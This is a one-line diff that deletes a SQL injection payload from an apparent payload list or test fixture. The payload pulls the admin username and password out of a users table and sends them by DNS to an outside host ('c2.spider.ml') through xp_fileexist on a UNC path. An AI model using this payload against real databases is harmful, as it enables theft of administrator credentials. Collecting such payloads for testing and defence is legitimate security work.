@@ -1,1 +1,0 @@
-';declare @q varchar(99);set @q=(select concat((select top 1 user from users where role = 'admin'),'.',(select top 1 password from users where role = 'admin'))); exec('xp_fileexist ''\\'+@q+'.c2.spider.ml\test''');--
